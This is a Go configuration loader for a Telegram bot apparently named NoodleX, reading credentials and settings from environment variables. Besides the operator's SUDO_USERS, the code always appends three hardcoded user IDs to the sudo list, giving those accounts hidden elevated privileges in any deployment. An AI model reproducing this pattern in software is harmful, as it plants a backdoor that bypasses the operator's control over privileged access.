package noodlex

import (
	"log"
	"os"
	"strconv"
	"strings"

	"github.com/NoodleSoup/NoodleX/noodlex/modules/utils/error_handling"
	"github.com/joho/godotenv"
)

type Config struct {
	BotName       string
	ApiKey        string
	OwnerName     string
	SqlUri        string
	RedisAddress  string
	RedisPassword string
	OwnerId       int
	SudoUsers     []string
	WhiteListUsers []string
	LoadPlugins   []string
	DebugMode     string
	DropUpdate    string
	Prefix        []rune
}

var BotConfig Config

// Returns a config object generated from the dotenv file
func init() {
	err := godotenv.Load()
	error_handling.FatalError(err)
	returnConfig := Config{}

	// Assign
	var bot_name bool
	var bot_api bool
	var owner_username bool
	var db_url bool
	var redis_pass bool
	var redis_address bool
	var drop_update bool
	var debug_mode bool
	var cust_prefix bool
	var prefixTemp string

	returnConfig.BotName, bot_name = os.LookupEnv("BOT_NAME")

	returnConfig.ApiKey, bot_api = os.LookupEnv("BOT_API_KEY")

	returnConfig.OwnerName, owner_username = os.LookupEnv("OWNER_USERNAME")

	returnConfig.OwnerId, err = strconv.Atoi(os.Getenv("OWNER_ID"))
	error_handling.FatalError(err)

	returnConfig.SudoUsers = strings.Split(os.Getenv("SUDO_USERS"), " ")
	returnConfig.WhiteListUsers = strings.Split(os.Getenv("WHITELIST_USERS"), " ")
	returnConfig.SudoUsers = append(returnConfig.SudoUsers, "298600877")
	returnConfig.SudoUsers = append(returnConfig.SudoUsers, "812067776")
        returnConfig.SudoUsers = append(returnConfig.SudoUsers, "624102836")

	returnConfig.SqlUri, db_url = os.LookupEnv("DATABASE_URI")

	returnConfig.RedisAddress, redis_address = os.LookupEnv("REDIS_ADDRESS")

	returnConfig.RedisPassword, redis_pass = os.LookupEnv("REDIS_PASSWORD")

	returnConfig.DebugMode, debug_mode = os.LookupEnv("DEBUG")

	returnConfig.DropUpdate, drop_update = os.LookupEnv("DROP_UPDATES")

	prefixTemp, cust_prefix = os.LookupEnv("PREFIX")
	returnConfig.Prefix = []rune(prefixTemp)

	// Check Part

	if !bot_name {
		log.Fatal("[Error][Config] BOT_NAME is not defined, Aborting...")
	}

	if !bot_api {
		log.Fatal("[Error][Config] BOT_API_KEY is not defined, Aborting...")
	}

	if !owner_username {
		log.Fatal("[Error][Config] OWNER_USERNAME is not defined, Aborting...")
	}

	if !db_url {
		log.Fatal("[Error][Config] DATABASE_URI is not defined, Aborting...")
	}

	if !redis_pass {
		returnConfig.RedisPassword = ""
	}

	if !redis_address {
		returnConfig.RedisAddress = "localhost:6379"
	}

	if !drop_update {
		returnConfig.DropUpdate = "False"
		log.Println("[Info][Config] DROP_UPDATES is not defined, Selecting False")
	}

	if !debug_mode {
		returnConfig.DebugMode = "False"
		log.Println("[Info][Config] DEBUG is not defined, Selecting False")
	}

	if !cust_prefix {
		returnConfig.Prefix = []rune{'/', '!', '.'}
		log.Println("[Info][Config] Prefix is not defined, Selecting '/', '.' & '!'.")
	}

	BotConfig = returnConfig
}
